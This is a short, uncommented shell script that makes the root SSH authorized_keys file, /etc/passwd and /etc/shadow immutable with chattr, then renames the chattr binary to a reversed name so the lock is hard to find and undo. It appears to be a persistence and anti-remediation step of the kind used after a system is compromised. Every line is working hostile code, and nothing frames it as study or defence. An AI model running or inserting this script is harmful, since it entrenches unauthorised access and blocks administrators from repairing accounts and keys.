#!/bin/sh

chattr +i /root/.ssh/authorized_keys
chattr +i /etc/passwd
chattr +i /etc/shadow

mv /usr/bin/chattr /usr/bin/rttahc
